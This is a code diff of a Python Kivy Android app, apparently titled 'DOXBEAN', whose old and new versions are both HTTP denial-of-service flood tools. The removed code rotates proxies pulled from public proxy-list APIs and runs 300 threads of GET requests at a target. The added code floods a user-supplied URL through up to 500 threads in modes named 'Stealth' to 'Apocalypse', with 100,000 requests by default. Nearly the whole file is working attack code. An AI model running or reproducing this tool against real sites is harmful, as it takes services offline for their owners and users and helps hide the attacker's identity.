@@ -1,5 +1,4 @@
-# DOXBEAN V11 - فیلد پاک می‌شه + REAL ATTACK
-# کپی کن → Pydroid3 → Run
+
 
 from kivy.lang import Builder
 from kivymd.app import MDApp
@@ -11,268 +10,166 @@ from kivymd.uix.list import OneLineListItem
 from kivy.core.window import Window
 from kivy.clock import Clock, mainthread
 from kivy.metrics import dp, sp
-import urllib3
+import requests
 import threading
 import time
-import random
+import concurrent.futures
 
-Window.clearcolor = (0.05, 0.05, 0.05, 1)
-
-PROXY_APIS = [
-    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=1000&country=all",
-    "https://www.proxy-list.download/api/v1/get?type=http"
-]
+Window.clearcolor = (0,0,0,1)
 
 KV = '''
 MDBoxLayout:
     orientation: "vertical"
     padding: dp(20)
-    spacing: dp(15)
-    md_bg_color: 0.05, 0.05, 0.05, 1
+    spacing: dp(12)
+    md_bg_color: 0,0,0,1
 
     MDLabel:
-        text: "DOXBEAN V11"
-        font_size: sp(34)
+        text: "DEFAULT V2"
+        font_size: sp(40)
         halign: "center"
-        text_color: 1, 1, 1, 1
-        bold: True
+        text_color: 1,0,0,1
 
-    MDLabel:
-        text: "REAL ATTACK + 300 THREADS"
-        font_size: sp(16)
-        halign: "center"
-        text_color: 0, 1, 0, 1
-        italic: True
-
-    MDLabel:
-        text: "Target"
-        text_color: 1, 0, 0, 1
-        font_size: sp(19)
-        bold: True
+    AsyncImage:
+        source: "logo.png"
+        size_hint_y: None
+        height: dp(180)
 
     MDTextField:
-        id: target
-        hint_text: "https://example.com"
-        text: "https://httpbin.org/get"
-        font_size: sp(17)
-        on_focus: if self.focus: self.text = "" if self.text == "https://httpbin.org/get" else self.text
-
-    MDLabel:
-        text: "Requests"
-        text_color: 1, 0, 0, 1
-        font_size: sp(19)
-        bold: True
+        id: url
+        hint_text: "target"
+        
 
     MDTextField:
-        id: requests
-        hint_text: "100"
-        text: "100"
+        id: req
+        hint_text: "requests"
+        
         input_filter: "int"
-        font_size: sp(17)
-        on_focus: if self.focus: self.text = "" if self.text == "100" else self.text
 
     MDLabel:
-        text: "Time (sec)"
-        text_color: 1, 0, 0, 1
-        font_size: sp(19)
-        bold: True
+        text: "MODE:"
+        text_color: 1,0.2,0,1
+        font_size: sp(20)
 
-    MDTextField:
-        id: time
-        hint_text: "10"
-        text: "10"
-        input_filter: "int"
-        font_size: sp(17)
-        on_focus: if self.focus: self.text = "" if self.text == "10" else self.text
+    MDRectangleFlatButton:
+        text: app.mode
+        on_release: app.change_mode()
+        md_bg_color: 0.3,0,0,1
+        font_size: sp(22)
+        height: dp(60)
 
     MDProgressBar:
         id: bar
         value: 0
-        color: 1, 0, 0, 1
 
     MDRectangleFlatButton:
-        id: launch_btn
-        text: "LAUNCH ATTACK"
-        md_bg_color: 0.6, 0, 0, 1
-        text_color: 1, 1, 1, 1
-        font_size: sp(26)
-        size_hint_y: None
-        height: dp(70)
-        on_release: app.toggle_attack()
+        text: "UNLEASH"
+        on_release: app.go()
+        md_bg_color: 0.5,0,0,1
+        font_size: sp(30)
+        height: dp(80)
 
-    MDLabel:
-        id: status
-        text: "Ready..."
-        halign: "center"
-        text_color: 1, 0.3, 0.3, 1
-        font_size: sp(19)
+    MDRectangleFlatButton:
+        text: "STOP"
+        on_release: app.stop()
+        md_bg_color: 0.7,0,0,1
 
     ScrollView:
-        size_hint_y: None
-        height: dp(160)
         MDList:
             id: log
 '''
-
-class AttackEngine:
-    def __init__(self, app):
-        self.app = app
-        self.running = False
-        self.sent = 0
-        self.total = 0
-        self.proxies = []
-        self.last_proxy_update = 0
-        self.http = urllib3.PoolManager(timeout=urllib3.Timeout(connect=1.0, read=2.0))
-
-    @mainthread
-    def log(self, msg):
-        try:
-            self.app.root.ids.log.add_widget(OneLineListItem(text=msg, text_color=[1,0.4,0.4,1]))
-        except: pass
-
-    @mainthread
-    def update_progress(self, percent):
-        try:
-            self.app.root.ids.bar.value = percent
-        except: pass
-
-    @mainthread
-    def set_status(self, txt):
-        try:
-            self.app.root.ids.status.text = txt
-        except: pass
-
-    @mainthread
-    def set_button(self, text, color):
-        try:
-            btn = self.app.root.ids.launch_btn
-            btn.text = text
-            btn.md_bg_color = color
-        except: pass
-
-    def fetch_proxies(self):
-        proxies = set()
-        for api in PROXY_APIS:
-            try:
-                r = self.http.request('GET', api, timeout=3)
-                if r.status == 200:
-                    for line in r.data.decode('utf-8', errors='ignore').splitlines():
-                        line = line.strip()
-                        if ':' in line and '.' in line:
-                            proxies.add(line)
-            except: pass
-        return list(proxies)[:80]
-
-    def get_proxy(self):
-        now = time.time()
-        if now - self.last_proxy_update >= 0.5 or not self.proxies:
-            self.proxies = self.fetch_proxies()
-            self.last_proxy_update = now
-            if self.proxies:
-                self.log(f"[PROXY] {len(self.proxies)} loaded")
-        return random.choice(self.proxies) if self.proxies else None
-
-    def send_single_request(self, url):
-        proxy = self.get_proxy()
-        try:
-            if proxy:
-                proxy_url = f"http://{proxy}"
-                proxy_http = urllib3.ProxyManager(proxy_url, timeout=urllib3.Timeout(2.0))
-                proxy_http.request('GET', url, headers={'User-Agent': 'DOXBEAN V11'})
-            else:
-                self.http.request('GET', url, headers={'User-Agent': 'DOXBEAN V11'})
-            return True
-        except:
-            return False
-
-    def attack(self):
-        url = self.app.root.ids.target.text.strip()
-        if not url.startswith("http"):
-            self.set_status("Invalid URL!")
-            self.app.finish_attack()
-            return
-
-        try: self.total = int(self.app.root.ids.requests.text or 100)
-        except: self.total = 100
-        try: duration = int(self.app.root.ids.time.text or 10)
-        except: duration = 10
-
-        self.log(f"[FIRE] {self.total} REQ | {duration}s")
-        self.set_status("ATTACKING...")
-        self.sent = 0
-        start = time.time()
-
-        def worker():
-            while self.running and time.time() - start < duration and self.sent < self.total:
-                if self.send_single_request(url):
-                    self.sent += 1
-                    if self.sent % 10 == 0 or self.sent == self.total:
-                        self.log(f"Sent: {self.sent}/{self.total}")
-                        self.update_progress(self.sent / self.total * 100)
-
-        threads = []
-        for _ in range(300):
-            if not self.running: break
-            t = threading.Thread(target=worker, daemon=True)
-            t.start()
-            threads.append(t)
-
-        end_time = time.time() + duration
-        while self.running and time.time() < end_time and self.sent < self.total:
-            time.sleep(0.1)
-
-        self.log("[DONE] TARGET SMASHED!")
-        self.set_status("ATTACK FINISHED")
-        self.update_progress(100)
-        self.app.finish_attack()
 
 class DoxApp(MDApp):
     def build(self):
         self.theme_cls.theme_style = "Dark"
         self.theme_cls.primary_palette = "Red"
+        self.modes = ["Stealth", "Rage", "Overkill", "Apocalypse"]
+        self.mode = "Rage"
         return Builder.load_string(KV)
 
     def on_start(self):
-        self.engine = AttackEngine(self)
-        self.log("DOXBEAN V11 – فیلد پاک می‌شه!")
+        self.engine = Attack(self)
+        self.log("DOXBEAN V2 READY! MODE: RAGE")
 
-    def toggle_attack(self):
-        if self.engine.running:
-            self.stop_attack()
-        else:
-            self.launch_attack()
-
-    def launch_attack(self):
-        if self.engine.running: return
+    def change_mode(self):
+        i = self.modes.index(self.mode) + 1
+        if i >= len(self.modes): i = 0
+        self.mode = self.modes[i]
         self.root.ids.log.clear_widgets()
-        self.engine.running = True
+        self.log(f"MODE CHANGED → {self.mode}")
+        self.root.children[5].text = self.mode  # آپدیت دکمه
+
+    def go(self):
+        if hasattr(self, 't') and self.t.is_alive():
+            self.log("ALREADY FIRING!")
+            return
+        self.root.ids.log.clear_widgets()
+        self.engine.run = True
         self.engine.sent = 0
-        self.engine.set_button("STOP ATTACK", [1, 0, 0, 1])
-        threading.Thread(target=self.engine.attack, daemon=True).start()
-        duration = int(self.root.ids.time.text or 10)
-        Clock.schedule_once(lambda dt: self.finish_attack(), duration)
+        self.engine.mode = self.mode
+        self.t = threading.Thread(target=self.engine.attack, daemon=True)
+        self.t.start()
 
-    def stop_attack(self):
-        self.engine.running = False
-        self.log("STOPPED BY USER")
-        self.finish_attack()
-
-    def finish_attack(self):
-        if not self.engine.running: return
-        self.engine.running = False
-        self.engine.set_button("LAUNCH ATTACK", [0.6, 0, 0, 1])
-        self.set_status("STOPPED")
+    def stop(self):
+        self.engine.run = False
+        self.log("STOPPED!")
 
     @mainthread
     def log(self, msg):
-        try:
-            self.root.ids.log.add_widget(OneLineListItem(text=msg, text_color=[1,0.4,0.4,1]))
-        except: pass
+        self.root.ids.log.add_widget(OneLineListItem(text=msg, text_color=[1,0.4,0.4,1]))
+
+class Attack:
+    def __init__(self, app):
+        self.app = app
+        self.run = True
+        self.sent = 0
+        self.total = 100000
 
     @mainthread
-    def set_status(self, txt):
+    def log(self, txt):
+        self.app.log(txt)
+
+    @mainthread
+    def prog(self, p):
+        self.app.root.ids.bar.value = p
+
+    def send(self, url):
         try:
-            self.root.ids.status.text = txt
-        except: pass
+            requests.get(url, timeout=2)
+            return True
+        except:
+            return False
+
+    def attack(self):
+        url = self.app.root.ids.url.text.strip()
+        self.total = int(self.app.root.ids.req.text or 10000)
+        mode = self.app.mode
+
+        delays = {
+            "Stealth": 0.8,
+            "Rage": 0.3,
+            "Overkill": 0.08,
+            "Apocalypse": 0.02
+        }
+        delay = delays[mode]
+        workers = 90 if mode == "Apocalypse" else 500
+
+        self.log(f"[FIRE] {mode} | {self.total} REQ | {workers} THREADS")
+        self.prog(0)
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as exe:
+            for i in range(0, self.total, workers):
+                if not self.run: break
+                batch = [url] * min(workers, self.total - i)
+                results = list(exe.map(self.send, batch))
+                ok = sum(results)
+                self.sent += ok
+                self.log(f"Sent: {self.sent}")
+                self.prog(self.sent / self.total * 100)
+                time.sleep(delay)
+
+        status = "TARGET OBLITERATED!" if self.run else "STOPPED"
+        self.log(f"[===] {status}")
+        self.prog(100 if self.run else 0)
 
 DoxApp().run()
